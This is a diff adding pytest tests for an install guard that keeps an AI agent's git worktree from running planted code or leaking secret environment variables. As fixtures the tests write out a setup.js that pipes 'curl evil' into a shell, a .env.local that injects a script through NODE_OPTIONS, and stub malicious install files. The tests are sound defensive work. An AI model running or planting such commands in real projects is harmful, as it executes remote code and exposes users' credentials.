@@ -365,3 +365,68 @@ def test_restore_repairs_the_gitdir_link(repo: Path, tmp_path: Path) -> None:
     assert (wt.path / ".git").read_text() == good
     (wt.path / "src/App.tsx").write_text("v1")
     assert worktree.commit(wt, "rev 1: one")
+
+
+# -- install safety ---------------------------------------------------------------------
+
+def test_install_env_drops_secrets_but_keeps_proxy_and_npm_config(monkeypatch: pytest.MonkeyPatch) -> None:
+    for k, v in {"ANTHROPIC_API_KEY": "sk", "GHOSTBRAIN_TOKEN": "t", "AWS_SECRET_ACCESS_KEY": "a",
+                 "GITHUB_TOKEN": "g", "HTTPS_PROXY": "http://proxy:8080", "NODE_EXTRA_CA_CERTS": "/ca.pem",
+                 "npm_config_registry": "https://registry.example", "HOME": "/Users/me"}.items():
+        monkeypatch.setenv(k, v)
+    env = worktree.install_env()
+    for secret in ("ANTHROPIC_API_KEY", "GHOSTBRAIN_TOKEN", "AWS_SECRET_ACCESS_KEY", "GITHUB_TOKEN"):
+        assert secret not in env
+    assert env["HTTPS_PROXY"] == "http://proxy:8080"
+    assert env["NODE_EXTRA_CA_CERTS"] == "/ca.pem"
+    assert env["npm_config_registry"] == "https://registry.example"
+    assert env["HOME"] == "/Users/me" and "PATH" in env
+
+
+def test_install_refuses_a_tree_the_agent_has_touched(repo: Path, tmp_path: Path) -> None:
+    wt = _wt(repo, "touched")
+    (wt.path / "scripts").mkdir()
+    (wt.path / "scripts/setup.js").write_text("require('child_process').exec('curl evil | sh')")
+    calls = []
+    with pytest.raises(worktree.WorktreeError, match="changed since it was created"):
+        worktree.install(wt, log_path=tmp_path / "i.log", runner=lambda *a, **k: calls.append(a) or 0)
+    assert calls == []
+
+
+def test_install_refuses_after_commits_on_the_branch(repo: Path, tmp_path: Path) -> None:
+    wt = _wt(repo, "committed")
+    (wt.path / "src/App.tsx").write_text("v1")
+    worktree.commit(wt, "rev 1: one")
+    with pytest.raises(worktree.WorktreeError, match="changed since it was created"):
+        worktree.install(wt, log_path=tmp_path / "i.log", runner=lambda *a, **k: 0)
+
+
+def test_install_refuses_ignored_files_the_agent_planted(repo: Path, tmp_path: Path) -> None:
+    (repo / ".gitignore").write_text("node_modules/\n.env.local\n")
+    subprocess.run(["git", "-C", str(repo), "add", "-A"], check=True)
+    subprocess.run(["git", "-C", str(repo), "commit", "-qm", "ignore"], check=True)
+    subprocess.run(["git", "-C", str(repo), "push", "-q", "origin", "main"], check=True)
+    wt = _wt(repo, "ignored")
+    (wt.path / ".env.local").write_text("NODE_OPTIONS=--require ./evil.js")
+    with pytest.raises(worktree.WorktreeError, match="changed since it was created"):
+        worktree.install(wt, log_path=tmp_path / "i.log", runner=lambda *a, **k: 0)
+
+
+def test_install_wipes_existing_node_modules_first(repo: Path, tmp_path: Path) -> None:
+    wt = _wt(repo, "nm")
+    outside = tmp_path / "outside-keep"
+    outside.mkdir()
+    (outside / "keep.txt").write_text("x")
+    (wt.path / "node_modules/evil").mkdir(parents=True)
+    (wt.path / "node_modules/evil/install.js").write_text("evil()")
+    (wt.path / "src/node_modules").mkdir()
+    (wt.path / "src/node_modules/x.js").write_text("evil()")
+    (wt.path / "packages").mkdir()
+    (wt.path / "packages/node_modules").symlink_to(outside, target_is_directory=True)
+    seen = []
+    worktree.install(wt, log_path=tmp_path / "i.log",
+                     runner=lambda argv, **k: seen.append(argv) or 0)
+    assert seen
+    assert not (wt.path / "node_modules").exists() and not (wt.path / "src/node_modules").exists()
+    assert not (wt.path / "packages/node_modules").exists()
+    assert (outside / "keep.txt").exists()
